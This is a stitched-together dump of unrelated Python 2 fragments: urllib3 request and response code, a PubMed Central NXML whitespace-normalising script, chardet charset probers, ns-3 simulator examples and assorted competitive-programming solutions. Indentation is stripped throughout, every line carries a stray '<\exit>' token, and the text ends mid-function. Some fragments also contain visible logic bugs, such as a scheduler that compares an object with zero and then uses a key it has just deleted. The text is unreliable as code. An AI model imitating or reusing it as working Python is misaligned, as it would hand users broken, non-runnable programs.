def urlopen(self, method, url, body=None, headers=None,<\exit>
encode_multipart=True, multipart_boundary=None,<\exit>
**kw):<\exit>
raise NotImplemented("Classes extending RequestMethods must implement "<\exit>
"their own ``urlopen`` method.")<\exit>
def request(self, method, url, fields=None, headers=None, **urlopen_kw):<\exit>
method = method.upper()<\exit>
if method in self._encode_url_methods:<\exit>
return self.request_encode_url(method, url, fields=fields,<\exit>
headers=headers,<\exit>
**urlopen_kw)<\exit>
else:<\exit>
return self.request_encode_body(method, url, fields=fields,<\exit>
headers=headers,<\exit>
**urlopen_kw)<\exit>
def request_encode_url(self, method, url, fields=None, **urlopen_kw):<\exit>
if fields:<\exit>
url += '?' + urlencode(fields)<\exit>
return self.urlopen(method, url, **urlopen_kw)<\exit>
def request_encode_body(self, method, url, fields=None, headers=None,<\exit>
encode_multipart=True, multipart_boundary=None,<\exit>
**urlopen_kw):<\exit>
if encode_multipart:<\exit>
body, content_type = encode_multipart_formdata(fields or {},<\exit>
boundary=multipart_boundary)<\exit>
else:<\exit>
body, content_type = (urlencode(fields or {}),<\exit>
'application/x-www-form-urlencoded')<\exit>
if headers is None:<\exit>
headers = self.headers<\exit>
headers_ = {'Content-Type': content_type}<\exit>
headers_.update(headers)<\exit>
return self.urlopen(method, url, body=body, headers=headers_,<\exit>
**urlopen_kw)<\exit>
from __future__ import with_statement<\exit>
import sys<\exit>
import os<\exit>
import re<\exit>
import codecs<\exit>
try:<\exit>
import xml.etree.ElementTree as ET<\exit>
except ImportError:<\exit>
import cElementTree as ET<\exit>
INSERTED_ELEMENT_TAG = "n2t-spc"<\exit>
INPUT_ENCODING="UTF-8"<\exit>
OUTPUT_ENCODING="UTF-8"<\exit>
options = None<\exit>
newline_wrap_element = set([<\exit>
"CURRENT_TITLE",<\exit>
"CURRENT_AUTHORLIST",<\exit>
"ABSTRACT",<\exit>
"P",<\exit>
"TABLE",<\exit>
"FIGURE",<\exit>
"HEADER",<\exit>
"REFERENCE",<\exit>
"article-title",<\exit>
"abstract",<\exit>
"title",<\exit>
"sec",<\exit>
"p",<\exit>
"contrib",<\exit>
"aff",<\exit>
"pub-date",<\exit>
"copyright-statement",<\exit>
"table",<\exit>
"table-wrap",<\exit>
"figure",<\exit>
"fig",<\exit>
"tr",<\exit>
"kwd-group",<\exit>
])<\exit>
space_wrap_element = set([<\exit>
"AUTHOR",<\exit>
"SURNAME",<\exit>
"CURRENT_AUTHOR",<\exit>
"CURRENT_SURNAME",<\exit>
"TITLE",<\exit>
"JOURNAL",<\exit>
"YEAR",<\exit>
"surname",<\exit>
"given-names",<\exit>
"email",<\exit>
"volume",<\exit>
"issue",<\exit>
"year",<\exit>
"month",<\exit>
"day",<\exit>
"fpage",<\exit>
"lpage",<\exit>
"pub-id",<\exit>
"copyright-year",<\exit>
"journal-id",<\exit>
"journal-title",<\exit>
"issn",<\exit>
"publisher-name",<\exit>
"article-id",<\exit>
"kwd",<\exit>
"label",<\exit>
"th",<\exit>
"td",<\exit>
])<\exit>
strip_element = newline_wrap_element | space_wrap_element<\exit>
class Standoff:<\exit>
def __init__(self, element, start, end):<\exit>
self.element = element<\exit>
self.start   = start<\exit>
self.end     = end<\exit>
def txt(s):<\exit>
return s if s is not None else ""<\exit>
def text_and_standoffs(e):<\exit>
strings, standoffs = [], []<\exit>
_text_and_standoffs(e, 0, strings, standoffs)<\exit>
text = "".join(strings)<\exit>
return text, standoffs<\exit>
def _text_and_standoffs(e, curroff, strings, standoffs):<\exit>
startoff = curroff<\exit>
so = Standoff(e, 0, 0)<\exit>
standoffs.append(so)<\exit>
if e.text is not None and e.text != "":<\exit>
strings.append(e.text)<\exit>
curroff += len(e.text)<\exit>
curroff = _subelem_text_and_standoffs(e, curroff, strings, standoffs)<\exit>
so.start = startoff<\exit>
so.end   = curroff<\exit>
return curroff<\exit>
def _subelem_text_and_standoffs(e, curroff, strings, standoffs):<\exit>
startoff = curroff<\exit>
for s in e:<\exit>
curroff = _text_and_standoffs(s, curroff, strings, standoffs)<\exit>
if s.tail is not None and s.tail != "":<\exit>
strings.append(s.tail)<\exit>
curroff += len(s.tail)<\exit>
return curroff<\exit>
def preceding_space(pos, text, rewritten={}):<\exit>
while pos > 0:<\exit>
pos -= 1<\exit>
if pos not in rewritten:<\exit>
return text[pos].isspace()<\exit>
elif rewritten[pos] is not None:<\exit>
return rewritten[pos].isspace()<\exit>
else:<\exit>
pass<\exit>
return True<\exit>
def following_space(pos, text, rewritten={}):<\exit>
while pos < len(text):<\exit>
if pos not in rewritten:<\exit>
return text[pos].isspace()<\exit>
elif rewritten[pos] is not None:<\exit>
return rewritten[pos].isspace()<\exit>
else:<\exit>
pass<\exit>
pos += 1<\exit>
return True<\exit>
def preceding_linebreak(pos, text, rewritten={}):<\exit>
if pos >= len(text):<\exit>
return True<\exit>
while pos > 0:<\exit>
pos -= 1<\exit>
c = rewritten.get(pos, text[pos])<\exit>
if c == "\n":<\exit>
return True<\exit>
elif c is not None and not c.isspace():<\exit>
return False<\exit>
else:<\exit>
pass<\exit>
return True<\exit>
def following_linebreak(pos, text, rewritten={}):<\exit>
while pos < len(text):<\exit>
c = rewritten.get(pos, text[pos])<\exit>
if c == "\n":<\exit>
return True<\exit>
elif c is not None and not c.isspace():<\exit>
return False<\exit>
else:<\exit>
pass<\exit>
pos += 1<\exit>
return True<\exit>
def index_in_parent(e, p):<\exit>
index = None<\exit>
for i in range(len(p)):<\exit>
if p[i] == e:<\exit>
index = i<\exit>
break<\exit>
assert i is not None, "index_in_parent: error: not parent and child"<\exit>
return i<\exit>
def space_normalize(root, text=None, standoffs=None):<\exit>
if text is None or standoffs is None:<\exit>
text, standoffs = text_and_standoffs(root)<\exit>
for so in standoffs:<\exit>
e = so.element<\exit>
if e.text is not None and e.text != "":<\exit>
e.text = re.sub(r'\s+', ' ', e.text)<\exit>
if e.tail is not None and e.tail != "":<\exit>
e.tail = re.sub(r'\s+', ' ', e.tail)<\exit>
def strip_elements(root, elements_to_strip=set(), text=None, standoffs=None):<\exit>
if text is None or standoffs is None:<\exit>
text, standoffs = text_and_standoffs(root)<\exit>
rewritten = {}<\exit>
for so in standoffs:<\exit>
e = so.element<\exit>
if e.tag == INSERTED_ELEMENT_TAG:<\exit>
continue<\exit>
if ((e.text is not None and e.text != "" and e.text[0].isspace()) and<\exit>
(element_in_set(e, elements_to_strip) or<\exit>
preceding_space(so.start, text, rewritten))):<\exit>
l = 0<\exit>
while l < len(e.text) and e.text[l].isspace():<\exit>
l += 1<\exit>
space, end = e.text[:l], e.text[l:]<\exit>
for i in range(l):<\exit>
assert so.start+i not in rewritten, "ERROR: dup remove at %d"  % (so.start+i)<\exit>
rewritten[so.start+i] = None<\exit>
e.text = end<\exit>
if len(e) == 0:<\exit>
if ((e.text is not None and e.text != "" and e.text[-1].isspace()) and<\exit>
(element_in_set(e, elements_to_strip) or<\exit>
following_space(so.end, text, rewritten))):<\exit>
l = 0<\exit>
while l < len(e.text) and e.text[-l-1].isspace():<\exit>
l += 1<\exit>
start, space = e.text[:-l], e.text[-l:]<\exit>
for i in range(l):<\exit>
o = so.end-i-1<\exit>
assert o not in rewritten, "ERROR: dup remove"<\exit>
rewritten[o] = None<\exit>
e.text = start<\exit>
else:<\exit>
c = e[-1]<\exit>
if ((c.tail is not None and c.tail != "" and c.tail[-1].isspace()) and<\exit>
(element_in_set(e, elements_to_strip) or<\exit>
following_space(so.end, text, rewritten))):<\exit>
l = 0<\exit>
while l < len(c.tail) and c.tail[-l-1].isspace():<\exit>
l += 1<\exit>
start, space = c.tail[:-l], c.tail[-l:]<\exit>
for i in range(l):<\exit>
o = so.end-i-1<\exit>
assert o not in rewritten, "ERROR: dup remove"<\exit>
rewritten[o] = None<\exit>
c.tail = start<\exit>
def trim_tails(root):<\exit>
text, standoffs = text_and_standoffs(root)<\exit>
for so in standoffs:<\exit>
e = so.element<\exit>
if (e.tail is not None and e.tail != "" and e.tail[0].isspace() and<\exit>
preceding_space(so.end, text)):<\exit>
l = 0<\exit>
while l < len(e.tail) and e.tail[l].isspace():<\exit>
l += 1<\exit>
space, end = e.tail[:l], e.tail[l:]<\exit>
e.tail = end<\exit>
def reduce_space(root, elements_to_strip=set()):<\exit>
text, standoffs = text_and_standoffs(root)<\exit>
strip_elements(root, elements_to_strip, text, standoffs)<\exit>
trim_tails(root)<\exit>
space_normalize(root, text, standoffs)<\exit>
def element_in_set(e, s):<\exit>
if e.tag[0] == "{":<\exit>
tag = re.sub(r'\{.*?\}', '', e.tag)<\exit>
else:<\exit>
tag = e.tag<\exit>
return tag in s<\exit>
def process(fn):<\exit>
global strip_element<\exit>
global options<\exit>
if fn == "-":<\exit>
fn = "/dev/stdin"<\exit>
try:<\exit>
tree = ET.parse(fn)<\exit>
except:<\exit>
print >> sys.stderr, "Error parsing %s" % fn<\exit>
raise<\exit>
root = tree.getroot()<\exit>
reduce_space(root, strip_element)<\exit>
text, standoffs = text_and_standoffs(root)<\exit>
respace = {}<\exit>
for so in standoffs:<\exit>
e = so.element<\exit>
if element_in_set(e, newline_wrap_element):<\exit>
if not (so.start in respace and (respace[so.start][0] == "\n" and<\exit>
respace[so.start][1] == False)):<\exit>
respace[so.start] = ("\n", True)<\exit>
respace[so.end] = ("\n", False)<\exit>
elif element_in_set(e, space_wrap_element):<\exit>
if not (so.start in respace and (respace[so.start][0] == "\n" or<\exit>
respace[so.start][1] == False)):<\exit>
respace[so.start] = (" ", True)<\exit>
if not (so.end in respace and respace[so.end][0] == "\n"):<\exit>
respace[so.end] = (" ", False)<\exit>
rewritten = {}<\exit>
filtered = {}<\exit>
for pos in sorted(respace.keys()):<\exit>
if respace[pos][0] == " ":<\exit>
if not (preceding_space(pos, text, rewritten) or<\exit>
following_space(pos, text, rewritten)):<\exit>
filtered[pos] = respace[pos]<\exit>
rewritten[pos-1] = " "<\exit>
else:<\exit>
assert respace[pos][0] == "\n", "INTERNAL ERROR"<\exit>
if not (preceding_linebreak(pos, text, rewritten) or<\exit>
following_linebreak(pos, text, rewritten)):<\exit>
filtered[pos] = respace[pos]<\exit>
rewritten[pos-1] = "\n"<\exit>
respace = filtered<\exit>
parent_map = {}<\exit>
for parent in root.getiterator():<\exit>
for child in parent:<\exit>
parent_map[child] = parent<\exit>
end_map = {}<\exit>
for so in standoffs:<\exit>
if so.end not in end_map:<\exit>
end_map[so.end] = []<\exit>
end_map[so.end].append(so)<\exit>
for so in standoffs:<\exit>
if so.start in respace and respace[so.start][1] == True:<\exit>
e = so.element<\exit>
assert e in parent_map, "INTERNAL ERROR: add space before root?"<\exit>
p = parent_map[e]<\exit>
i = index_in_parent(e, p)<\exit>
rse = ET.Element(INSERTED_ELEMENT_TAG)<\exit>
rse.text = respace[so.start][0]<\exit>
p.insert(i, rse)<\exit>
del respace[so.start]<\exit>
if so.end in respace and respace[so.end][1] == False:<\exit>
maxlen = max([s.end-s.start for s in end_map[so.end]])<\exit>
if so.end-so.start != maxlen:<\exit>
continue<\exit>
longest = [s for s in end_map[so.end] if s.end-s.start == maxlen]<\exit>
if so != longest[0]:<\exit>
continue<\exit>
e = so.element<\exit>
assert e in parent_map, "INTERNAL ERROR: add space after root?"<\exit>
p = parent_map[e]<\exit>
i = index_in_parent(e, p)<\exit>
rse = ET.Element(INSERTED_ELEMENT_TAG)<\exit>
rse.text = respace[so.end][0]<\exit>
p.insert(i+1, rse)<\exit>
rse.tail = e.tail<\exit>
e.tail = ""<\exit>
del respace[so.end]<\exit>
assert len(respace) == 0, "INTERNAL ERROR: failed to insert %s" % str(respace)<\exit>
strip_elements(root)<\exit>
trim_tails(root)<\exit>
if options.stdout:<\exit>
tree.write(sys.stdout, encoding=OUTPUT_ENCODING)<\exit>
return True<\exit>
if options is not None and options.directory is not None:<\exit>
output_dir = options.directory<\exit>
else:<\exit>
output_dir = ""<\exit>
output_fn = os.path.join(output_dir, os.path.basename(fn))<\exit>
if output_fn == fn and not options.overwrite:<\exit>
print >> sys.stderr, 'respace: skipping output for %s: file would overwrite input (consider -d and -o options)' % fn<\exit>
else:<\exit>
try:<\exit>
with open(output_fn, 'w') as of:<\exit>
tree.write(of, encoding=OUTPUT_ENCODING)<\exit>
except IOError, ex:<\exit>
print >> sys.stderr, 'respace: failed write: %s' % ex<\exit>
return True<\exit>
def argparser():<\exit>
import argparse<\exit>
ap=argparse.ArgumentParser(description='Revise whitespace content of a PMC NXML file for text extraction.')<\exit>
ap.add_argument('-d', '--directory', default=None, metavar='DIR', help='output directory')<\exit>
ap.add_argument('-o', '--overwrite', default=False, action='store_true', help='allow output to overwrite input files')<\exit>
ap.add_argument('-s', '--stdout', default=False, action='store_true', help='output to stdout')<\exit>
ap.add_argument('file', nargs='+', help='input PubMed Central NXML file')<\exit>
return ap<\exit>
def main(argv):<\exit>
global options<\exit>
options = argparser().parse_args(argv[1:])<\exit>
for fn in options.file:<\exit>
process(fn)<\exit>
return 0<\exit>
if __name__ == "__main__":<\exit>
sys.exit(main(sys.argv))<\exit>
import gzip<\exit>
import logging<\exit>
import zlib<\exit>
from io import BytesIO<\exit>
from .exceptions import DecodeError<\exit>
from .packages.six import string_types as basestring<\exit>
log = logging.getLogger(__name__)<\exit>
def decode_gzip(data):<\exit>
gzipper = gzip.GzipFile(fileobj=BytesIO(data))<\exit>
return gzipper.read()<\exit>
def decode_deflate(data):<\exit>
try:<\exit>
return zlib.decompress(data)<\exit>
except zlib.error:<\exit>
return zlib.decompress(data, -zlib.MAX_WBITS)<\exit>
class HTTPResponse(object):<\exit>
CONTENT_DECODERS = {<\exit>
'gzip': decode_gzip,<\exit>
'deflate': decode_deflate,<\exit>
}<\exit>
def __init__(self, body='', headers=None, status=0, version=0, reason=None,<\exit>
strict=0, preload_content=True, decode_content=True,<\exit>
original_response=None, pool=None, connection=None):<\exit>
self.headers = headers or {}<\exit>
self.status = status<\exit>
self.version = version<\exit>
self.reason = reason<\exit>
self.strict = strict<\exit>
self._decode_content = decode_content<\exit>
self._body = body if body and isinstance(body, basestring) else None<\exit>
self._fp = None<\exit>
self._original_response = original_response<\exit>
self._pool = pool<\exit>
self._connection = connection<\exit>
if hasattr(body, 'read'):<\exit>
self._fp = body<\exit>
if preload_content and not self._body:<\exit>
self._body = self.read(decode_content=decode_content)<\exit>
def get_redirect_location(self):<\exit>
if self.status in [301, 302, 303, 307]:<\exit>
return self.headers.get('location')<\exit>
return False<\exit>
def release_conn(self):<\exit>
if not self._pool or not self._connection:<\exit>
return<\exit>
self._pool._put_conn(self._connection)<\exit>
self._connection = None<\exit>
@property<\exit>
def data(self):<\exit>
if self._body:<\exit>
return self._body<\exit>
if self._fp:<\exit>
return self.read(cache_content=True)<\exit>
def read(self, amt=None, decode_content=None, cache_content=False):<\exit>
content_encoding = self.headers.get('content-encoding', '').lower()<\exit>
decoder = self.CONTENT_DECODERS.get(content_encoding)<\exit>
if decode_content is None:<\exit>
decode_content = self._decode_content<\exit>
if self._fp is None:<\exit>
return<\exit>
try:<\exit>
if amt is None:<\exit>
data = self._fp.read()<\exit>
else:<\exit>
return self._fp.read(amt)<\exit>
try:<\exit>
if decode_content and decoder:<\exit>
data = decoder(data)<\exit>
except (IOError, zlib.error):<\exit>
raise DecodeError("Received response with content-encoding: %s, but "<\exit>
"failed to decode it." % content_encoding)<\exit>
if cache_content:<\exit>
self._body = data<\exit>
return data<\exit>
finally:<\exit>
if self._original_response and self._original_response.isclosed():<\exit>
self.release_conn()<\exit>
@classmethod<\exit>
def from_httplib(ResponseCls, r, **response_kw):<\exit>
headers = {}<\exit>
for k, v in r.getheaders():<\exit>
k = k.lower()<\exit>
has_value = headers.get(k)<\exit>
if has_value:<\exit>
v = ', '.join([has_value, v])<\exit>
headers[k] = v<\exit>
strict = getattr(r, 'strict', 0)<\exit>
return ResponseCls(body=r,<\exit>
headers=headers,<\exit>
status=r.status,<\exit>
version=r.version,<\exit>
reason=r.reason,<\exit>
strict=strict,<\exit>
original_response=r,<\exit>
**response_kw)<\exit>
def getheaders(self):<\exit>
return self.headers<\exit>
def getheader(self, name, default=None):<\exit>
return self.headers.get(name, default)<\exit>
class Solution(object):<\exit>
def solve(self, cipher):<\exit>
l, b = cipher<\exit>
r = self.gcd(l, b)<\exit>
return (l * b) / (r * r)<\exit>
def gcd(self, a, b):<\exit>
while b:<\exit>
a, b = b, a % b<\exit>
return a<\exit>
if __name__ == "__main__":<\exit>
import sys<\exit>
f = open("1.in", "r")<\exit>
testcases = int(f.readline().strip())<\exit>
for t in xrange(testcases):<\exit>
cipher = map(int, f.readline().strip().split(' '))<\exit>
s = "%s\n" % (Solution().solve(cipher))<\exit>
print s,<\exit>
class Solution(object):<\exit>
def solve(self, cipher):<\exit>
N, K = cipher<\exit>
if K < N / 2:<\exit>
return 2 * K + 1<\exit>
else:<\exit>
return 2 * (N - 1 - K)<\exit>
if __name__ == "__main__":<\exit>
import sys<\exit>
f = open("1.in", "r")<\exit>
testcases = int(f.readline().strip())<\exit>
for t in xrange(testcases):<\exit>
cipher = map(int, f.readline().strip().split(' '))<\exit>
s = "%s\n" % (Solution().solve(cipher))<\exit>
print s,<\exit>
class ListNode:<\exit>
def __init__(self, x):<\exit>
self.val = x<\exit>
self.next = None<\exit>
class Solution:<\exit>
def rotateRight(self, head, k):<\exit>
if not head:<\exit>
return head<\exit>
dummy = ListNode(0)<\exit>
dummy.next = head<\exit>
l = self.get_len(head)<\exit>
k %= l<\exit>
pre = dummy<\exit>
i = 0<\exit>
while pre and i < l-k:<\exit>
pre = pre.next<\exit>
i += 1<\exit>
new_head = pre.next<\exit>
if not new_head:<\exit>
return dummy.next<\exit>
cur = new_head<\exit>
pre.next = None<\exit>
while cur.next:<\exit>
cur = cur.next<\exit>
cur.next = dummy.next<\exit>
dummy.next = new_head<\exit>
return dummy.next<\exit>
def get_len(self, head):<\exit>
l = 0<\exit>
cur = head<\exit>
while cur:<\exit>
l += 1<\exit>
cur = cur.next<\exit>
return l<\exit>
class DirectedGraphNode:<\exit>
def __init__(self, x):<\exit>
self.label = x<\exit>
self.neighbors = []<\exit>
class Solution(object):<\exit>
def hasRoute(self, graph, s, t):<\exit>
visited = set()<\exit>
return self.dfs(s, t, visited)<\exit>
def dfs(self, s, t, visited):<\exit>
if s == t:<\exit>
return True<\exit>
visited.add(s)<\exit>
for nbr in s.neighbors:<\exit>
if nbr not in visited:<\exit>
if self.dfs(nbr, t, visited):<\exit>
return True<\exit>
return False<\exit>
MOD = 1e9 + 7<\exit>
class Solution(object):<\exit>
def solve_TLE(self, cipher):<\exit>
A = map(int, list(cipher))<\exit>
f = A[0]<\exit>
num = A[0]<\exit>
sig = 1<\exit>
for i in xrange(1, len(A)):<\exit>
num = 10 * num + A[i]<\exit>
sig *= 10<\exit>
temp = num<\exit>
temp_sig = sig<\exit>
while temp_sig >= 1:<\exit>
f += temp<\exit>
f %= MOD<\exit>
temp %= temp_sig<\exit>
temp_sig /= 10<\exit>
return int(f)<\exit>
def solve(self, cipher):<\exit>
pre = [0 for _ in cipher]<\exit>
pre[0] = int(cipher[0])<\exit>
for i in xrange(1, len(cipher)):<\exit>
pre[i] = (pre[i - 1] * 10 + int(cipher[i]) * (i + 1)) % MOD<\exit>
s = 0<\exit>
for elt in pre:<\exit>
s = (s + elt) % MOD<\exit>
return int(s)<\exit>
if __name__ == "__main__":<\exit>
import sys<\exit>
f = open("0.in", "r")<\exit>
solution = Solution()<\exit>
cipher = f.readline().strip()<\exit>
s = "%s\n" % (solution.solve(cipher))<\exit>
print s,<\exit>
import numpy as np<\exit>
import matplotlib.pyplot as plt<\exit>
import ns.core<\exit>
rng = ns.core.NormalVariable(100.0, 225.0)<\exit>
x = [rng.GetValue() for t in range(10000)]<\exit>
n, bins, patches = plt.hist(x, 50, normed=1, facecolor='g', alpha=0.75)<\exit>
plt.title('ns-3 histogram')<\exit>
plt.text(60, .025, r'$\mu=100,\ \sigma=15$')<\exit>
plt.axis([40, 160, 0, 0.03])<\exit>
plt.grid(True)<\exit>
plt.show()<\exit>
import ns.core<\exit>
class MyModel(object):<\exit>
def Start(self):<\exit>
ns.core.Simulator.Schedule(ns.core.Seconds(10.0), self.HandleEvent, ns.core.Simulator.Now().GetSeconds())<\exit>
def HandleEvent(self, value):<\exit>
print "Member method received event at", ns.core.Simulator.Now().GetSeconds(), \<\exit>
"s started at", value, "s"<\exit>
def ExampleFunction(model):<\exit>
print "ExampleFunction received event at", ns.core.Simulator.Now().GetSeconds(), "s"<\exit>
model.Start()<\exit>
def RandomFunction(model):<\exit>
print "RandomFunction received event at", ns.core.Simulator.Now().GetSeconds(), "s"<\exit>
def CancelledEvent():<\exit>
print "I should never be called... "<\exit>
def main(dummy_argv):<\exit>
model = MyModel()<\exit>
v = ns.core.UniformVariable(10,20)<\exit>
ns.core.Simulator.Schedule(ns.core.Seconds(10.0), ExampleFunction, model)<\exit>
ns.core.Simulator.Schedule(ns.core.Seconds(v.GetValue()), RandomFunction, model)<\exit>
id = ns.core.Simulator.Schedule(ns.core.Seconds(30.0), CancelledEvent)<\exit>
ns.core.Simulator.Cancel(id)<\exit>
ns.core.Simulator.Run()<\exit>
ns.core.Simulator.Destroy()<\exit>
if __name__ == '__main__':<\exit>
import sys<\exit>
main(sys.argv)<\exit>
class Solution(object):<\exit>
def solve(self, cipher):<\exit>
N, A = cipher<\exit>
ret = 0<\exit>
for i, val in enumerate(A):<\exit>
if (i + 1) * (N - i) % 2 == 1:<\exit>
ret ^= val<\exit>
return ret<\exit>
if __name__ == "__main__":<\exit>
import sys<\exit>
f = open("1.in", "r")<\exit>
solution = Solution()<\exit>
testcases = int(f.readline().strip())<\exit>
for t in xrange(testcases):<\exit>
N = int(f.readline().strip())<\exit>
A = map(int, f.readline().strip().split(' '))<\exit>
cipher = N, A<\exit>
s = "%s\n" % (solution.solve(cipher))<\exit>
print s,<\exit>
import sys<\exit>
from . import constants<\exit>
from .charsetprober import CharSetProber<\exit>
from .compat import wrap_ord<\exit>
SAMPLE_SIZE = 64<\exit>
SB_ENOUGH_REL_THRESHOLD = 1024<\exit>
POSITIVE_SHORTCUT_THRESHOLD = 0.95<\exit>
NEGATIVE_SHORTCUT_THRESHOLD = 0.05<\exit>
SYMBOL_CAT_ORDER = 250<\exit>
NUMBER_OF_SEQ_CAT = 4<\exit>
POSITIVE_CAT = NUMBER_OF_SEQ_CAT - 1<\exit>
class SingleByteCharSetProber(CharSetProber):<\exit>
def __init__(self, model, reversed=False, nameProber=None):<\exit>
CharSetProber.__init__(self)<\exit>
self._mModel = model<\exit>
self._mReversed = reversed<\exit>
self._mNameProber = nameProber<\exit>
self.reset()<\exit>
def reset(self):<\exit>
CharSetProber.reset(self)<\exit>
self._mLastOrder = 255<\exit>
self._mSeqCounters = [0] * NUMBER_OF_SEQ_CAT<\exit>
self._mTotalSeqs = 0<\exit>
self._mTotalChar = 0<\exit>
self._mFreqChar = 0<\exit>
def get_charset_name(self):<\exit>
if self._mNameProber:<\exit>
return self._mNameProber.get_charset_name()<\exit>
else:<\exit>
return self._mModel['charsetName']<\exit>
def feed(self, aBuf):<\exit>
if not self._mModel['keepEnglishLetter']:<\exit>
aBuf = self.filter_without_english_letters(aBuf)<\exit>
aLen = len(aBuf)<\exit>
if not aLen:<\exit>
return self.get_state()<\exit>
for c in aBuf:<\exit>
order = self._mModel['charToOrderMap'][wrap_ord(c)]<\exit>
if order < SYMBOL_CAT_ORDER:<\exit>
self._mTotalChar += 1<\exit>
if order < SAMPLE_SIZE:<\exit>
self._mFreqChar += 1<\exit>
if self._mLastOrder < SAMPLE_SIZE:<\exit>
self._mTotalSeqs += 1<\exit>
if not self._mReversed:<\exit>
i = (self._mLastOrder * SAMPLE_SIZE) + order<\exit>
model = self._mModel['precedenceMatrix'][i]<\exit>
else:<\exit>
i = (order * SAMPLE_SIZE) + self._mLastOrder<\exit>
model = self._mModel['precedenceMatrix'][i]<\exit>
self._mSeqCounters[model] += 1<\exit>
self._mLastOrder = order<\exit>
if self.get_state() == constants.eDetecting:<\exit>
if self._mTotalSeqs > SB_ENOUGH_REL_THRESHOLD:<\exit>
cf = self.get_confidence()<\exit>
if cf > POSITIVE_SHORTCUT_THRESHOLD:<\exit>
if constants._debug:<\exit>
sys.stderr.write('%s confidence = %s, we have a'<\exit>
'winner\n' %<\exit>
(self._mModel['charsetName'], cf))<\exit>
self._mState = constants.eFoundIt<\exit>
elif cf < NEGATIVE_SHORTCUT_THRESHOLD:<\exit>
if constants._debug:<\exit>
sys.stderr.write('%s confidence = %s, below negative'<\exit>
'shortcut threshhold %s\n' %<\exit>
(self._mModel['charsetName'], cf,<\exit>
NEGATIVE_SHORTCUT_THRESHOLD))<\exit>
self._mState = constants.eNotMe<\exit>
return self.get_state()<\exit>
def get_confidence(self):<\exit>
r = 0.01<\exit>
if self._mTotalSeqs > 0:<\exit>
r = ((1.0 * self._mSeqCounters[POSITIVE_CAT]) / self._mTotalSeqs<\exit>
/ self._mModel['mTypicalPositiveRatio'])<\exit>
r = r * self._mFreqChar / self._mTotalChar<\exit>
if r >= 1.0:<\exit>
r = 0.99<\exit>
return r<\exit>
from .charsetgroupprober import CharSetGroupProber<\exit>
from .sbcharsetprober import SingleByteCharSetProber<\exit>
from .langcyrillicmodel import (Win1251CyrillicModel, Koi8rModel,<\exit>
Latin5CyrillicModel, MacCyrillicModel,<\exit>
Ibm866Model, Ibm855Model)<\exit>
from .langgreekmodel import Latin7GreekModel, Win1253GreekModel<\exit>
from .langbulgarianmodel import Latin5BulgarianModel, Win1251BulgarianModel<\exit>
from .langhungarianmodel import Latin2HungarianModel, Win1250HungarianModel<\exit>
from .langthaimodel import TIS620ThaiModel<\exit>
from .langhebrewmodel import Win1255HebrewModel<\exit>
from .hebrewprober import HebrewProber<\exit>
class SBCSGroupProber(CharSetGroupProber):<\exit>
def __init__(self):<\exit>
CharSetGroupProber.__init__(self)<\exit>
self._mProbers = [<\exit>
SingleByteCharSetProber(Win1251CyrillicModel),<\exit>
SingleByteCharSetProber(Koi8rModel),<\exit>
SingleByteCharSetProber(Latin5CyrillicModel),<\exit>
SingleByteCharSetProber(MacCyrillicModel),<\exit>
SingleByteCharSetProber(Ibm866Model),<\exit>
SingleByteCharSetProber(Ibm855Model),<\exit>
SingleByteCharSetProber(Latin7GreekModel),<\exit>
SingleByteCharSetProber(Win1253GreekModel),<\exit>
SingleByteCharSetProber(Latin5BulgarianModel),<\exit>
SingleByteCharSetProber(Win1251BulgarianModel),<\exit>
SingleByteCharSetProber(Latin2HungarianModel),<\exit>
SingleByteCharSetProber(Win1250HungarianModel),<\exit>
SingleByteCharSetProber(TIS620ThaiModel),<\exit>
]<\exit>
hebrewProber = HebrewProber()<\exit>
logicalHebrewProber = SingleByteCharSetProber(Win1255HebrewModel,<\exit>
False, hebrewProber)<\exit>
visualHebrewProber = SingleByteCharSetProber(Win1255HebrewModel, True,<\exit>
hebrewProber)<\exit>
hebrewProber.set_model_probers(logicalHebrewProber, visualHebrewProber)<\exit>
self._mProbers.extend([hebrewProber, logicalHebrewProber,<\exit>
visualHebrewProber])<\exit>
self.reset()<\exit>
from collections import defaultdict<\exit>
class Val(object):<\exit>
def __init__(self):<\exit>
self.cnt = 0<\exit>
self.start = 0<\exit>
class TaskScheduleSolution(object):<\exit>
def solve(self, A, intvl):<\exit>
m = defaultdict(Val)<\exit>
for e in A:<\exit>
m[e].cnt += 1<\exit>
t = 0<\exit>
for _ in A:<\exit>
maxa = None<\exit>
for k, v in m.items():<\exit>
if not maxa or m[maxa].cnt <= v.cnt:<\exit>
if m[maxa].cnt == v.cnt and m[maxa].start > v.start:<\exit>
maxa = k<\exit>
elif m[maxa].cnt < v.cnt:<\exit>
maxa = k<\exit>
t = max(t, m[maxa].start)+1<\exit>
m[maxa].cnt -= 1<\exit>
if m[maxa] <= 0:<\exit>
del m[maxa]<\exit>
m[maxa].start = t+intvl<\exit>
return t<\exit>
if __name__ == "__main__":<\exit>
assert TaskScheduleSolution().solve([1, 1, 2, 1], 2) == 7<\exit>
assert TaskScheduleSolution().solve([1, 2, 3, 1, 2, 3], 3) == 7<\exit>
class TreeNode:<\exit>
def __init__(self, val):<\exit>
self.val = val<\exit>
self.left, self.right = None, None<\exit>
class Solution(object):<\exit>
def searchRange(self, root, k1, k2):<\exit>
ret = []<\exit>
self.dfs(root, k1, k2, ret)<\exit>
return ret<\exit>
def dfs(self, root, k1, k2, ret):<\exit>
if not root:<\exit>
return<\exit>
if root.val < k1:<\exit>
self.dfs(root.right, k1, k2, ret)<\exit>
elif root.val > k2:<\exit>
self.dfs(root.left, k1, k2, ret)<\exit>
else:<\exit>
self.dfs(root.left, k1, k2, ret)<\exit>
ret.append(root.val)<\exit>
self.dfs(root.right, k1, k2, ret)<\exit>
class SegmentTreeNode:<\exit>
def __init__(self, start, end):<\exit>
self.start, self.end = start, end<\exit>
self.left, self.right = None, None<\exit>
class Solution:<\exit>
def build(self, start, end):<\exit>
if start > end:<\exit>
return None<\exit>
root = SegmentTreeNode(start, end)<\exit>
if start == end:<\exit>
return root<\exit>
root.left = self.build(start, (start+end)/2)<\exit>
root.right = self.build((start+end)/2+1, end)<\exit>
return root<\exit>
class SegmentTreeNode:<\exit>
def __init__(self, start, end, max):<\exit>
self.start, self.end, self.max = start, end, max<\exit>
self.left, self.right = None, None<\exit>
class Solution:<\exit>
def modify(self, root, index, value):<\exit>
if root is None:<\exit>
return<\exit>
if index < root.start or index > root.end:<\exit>
return<\exit>
if root.start == index and root.end == index:<\exit>
root.max = value<\exit>
return<\exit>
self.modify(root.left, index, value)<\exit>
self.modify(root.right, index, value)<\exit>
m = value<\exit>
if root.left:<\exit>
m = max(m, root.left.max)<\exit>
if root.right:<\exit>
